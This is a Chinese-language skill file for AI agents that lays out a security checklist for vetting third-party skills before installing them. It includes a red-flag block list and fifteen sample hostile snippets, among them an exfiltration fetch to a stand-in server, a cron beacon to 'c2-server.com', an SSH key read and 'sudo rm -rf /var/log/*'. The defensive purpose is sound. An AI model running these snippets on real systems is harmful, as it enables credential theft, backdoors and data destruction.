---
license: UNKNOWN
name: skill-vetter
version: 1.0.0
description: 安全优先的技能审核工具。在安装任何来自ClawdHub、GitHub或其他来源的技能前使用。检查危险信号、权限范围和可疑模式。
allowed-tools: - Read
- Grep
- Glob
- Bash
- WebFetch
- AskUserQuestion
triggers: ["skill vetter", "Skill Vetter 🔒"]
---

# Skill Vetter 🔒

安全优先的AI Agent技能审核协议。**永远不要在未审核的情况下安装技能。**

## 使用时机

- 安装ClawdHub技能之前
- 运行GitHub仓库技能之前
- 评估其他Agent分享的技能时
- 任何被要求安装未知代码时

## 审核协议

### Step 1: 来源检查

```
问题清单:
- [ ] 这个技能来自哪里?
- [ ] 作者是否知名/有声誉?
- [ ] 有多少下载量/Stars?
- [ ] 最后更新时间?
- [ ] 是否有其他Agent的评价?
```

### Step 2: 代码审查 (强制)

读取技能中的**所有文件**。检查以下**危险信号**:

```
🚨 立即拒绝如果发现:
─────────────────────────────────────────
• curl/wget 到未知URL
• 向外部服务器发送数据
• 请求凭据/tokens/API keys
• 读取 ~/.ssh, ~/.aws, ~/.config 无明确理由
• 访问 MEMORY.md, USER.md, SOUL.md, IDENTITY.md
• 对任何内容使用 base64 decode
• 使用 eval() 或 exec() 处理外部输入
• 修改工作区外的系统文件
• 未列出的包安装
• 调用IP而非域名
• 混淆代码 (压缩、编码、最小化)
• 请求提升/sudo权限
• 访问浏览器cookies/sessions
• 触碰凭据文件
─────────────────────────────────────────
```

### Step 3: 权限范围

```
评估:
- [ ] 需要读取哪些文件?
- [ ] 需要写入哪些文件?
- [ ] 运行哪些命令?
- [ ] 是否需要网络访问? 访问哪里?
- [ ] 权限范围是否最小化?
```

### Step 4: 风险分类

| 风险级别 | 示例 | 操作 |
|----------|------|------|
| 🟢 低风险 | 笔记、天气、格式化 | 基础审查，可安装 |
| 🟡 中风险 | 文件操作、浏览器、API | 需完整代码审查 |
| 🔴 高风险 | 凭据、交易、系统 | 需人工批准 |
| ⛔ 极高风险 | 安全配置、root访问 | 禁止安装 |

## 输出格式

审核后生成此报告:

```
技能审核报告
═══════════════════════════════════════
技能: [名称]
来源: [ClawdHub / GitHub / 其他]
作者: [用户名]
版本: [版本]
───────────────────────────────────────
指标:
• 下载量/Stars: [数量]
• 最后更新: [日期]
• 已审查文件: [数量]
───────────────────────────────────────
危险信号: [无 / 列出]

所需权限:
• 文件: [列表或"无"]
• 网络: [列表或"无"]
• 命令: [列表或"无"]
───────────────────────────────────────
风险级别: [🟢 低 / 🟡 中 / 🔴 高 / ⛔ 极高]

裁决: [✅ 可安全安装 / ⚠️ 谨慎安装 / ❌ 禁止安装]

备注: [任何观察]
═══════════════════════════════════════
```

## 快速审核命令

对于GitHub托管的技能:
```bash
# 检查仓库统计
curl -s "https://api.github.com/repos/OWNER/REPO" | jq '{stars: .stargazers_count, forks: .forks_count, updated: .updated_at}'

# 列出技能文件
curl -s "https://api.github.com/repos/OWNER/REPO/contents/skills/SKILL_NAME" | jq '.[].name'

# 获取并审查SKILL.md
curl -s "https://raw.githubusercontent.com/OWNER/REPO/main/skills/SKILL_NAME/SKILL.md"
```

## 信任层级

1. **官方OpenClaw技能** → 较低审查（仍需审查）
2. **高星仓库 (1000+)** → 中等审查
3. **知名作者** → 中等审查
4. **新/未知来源** → 最高审查
5. **请求凭据的技能** → 始终需人工批准

## 15项危险信号详解

### 1. 外部数据外泄
```javascript
// 🚨 危险: 发送数据到未知服务器
fetch('https://unknown-server.com/collect', { method: 'POST', body: data })
```

### 2. 凭据收集
```javascript
// 🚨 危险: 请求敏感信息
const apiKey = await askUser('请输入您的OpenAI API Key')
```

### 3. 敏感文件访问
```javascript
// 🚨 危险: 读取SSH密钥
const sshKey = fs.readFileSync('~/.ssh/id_rsa')
```

### 4. 代码执行
```javascript
// 🚨 危险: 动态执行代码
eval(userInput)
exec(command)
```

### 5. 系统修改
```javascript
// 🚨 危险: 修改系统文件
fs.writeFileSync('/etc/hosts', '...')
```

### 6. 混淆代码
```javascript
// 🚨 危险: Base64编码的可疑内容
eval(atob('YWxlcnQoJ2hpJyk='))
```

### 7. 网络混淆
```javascript
// 🚨 危险: 直接IP连接
fetch('http://192.168.1.1:8080/data')
```

### 8. 权限提升
```bash
# 🚨 危险: 请求sudo
sudo rm -rf /var/log/*
```

### 9. 凭据文件访问
```javascript
// 🚨 危险: 读取浏览器cookies
const cookies = browser.cookies.getAll()
```

### 10. 身份文件访问
```javascript
// 🚨 危险: 读取用户身份文件
const identity = fs.readFileSync('IDENTITY.md')
```

### 11. 隐藏依赖
```json
// 🚨 危险: 未声明的依赖
{
  "dependencies": {
    "malicious-package": "^1.0.0"
  }
}
```

### 12. 加密货币挖矿
```javascript
// 🚨 危险: CPU密集型任务
while(true) { hash = crypto.createHash('sha256').update(data) }
```

### 13. 后门植入
```javascript
// 🚨 危险: 创建持久化后门
cron.schedule('*/5 * * * *', () => fetch('https://c2-server.com/beacon'))
```

### 14. 数据库操作
```javascript
// 🚨 危险: 未授权的数据库访问
db.query('SELECT * FROM users WHERE password IS NOT NULL')
```

### 15. 进程注入
```javascript
// 🚨 危险: 进程注入
process.binding('spawn').spawn('/bin/bash', ['-c', command])
```

## 记住

- 没有任何技能值得牺牲安全
- 有疑问时，不要安装
- 高风险决策请询问人类
- 记录你审核的内容以备将来参考

---

*偏执是一种特性。* 🔒🦀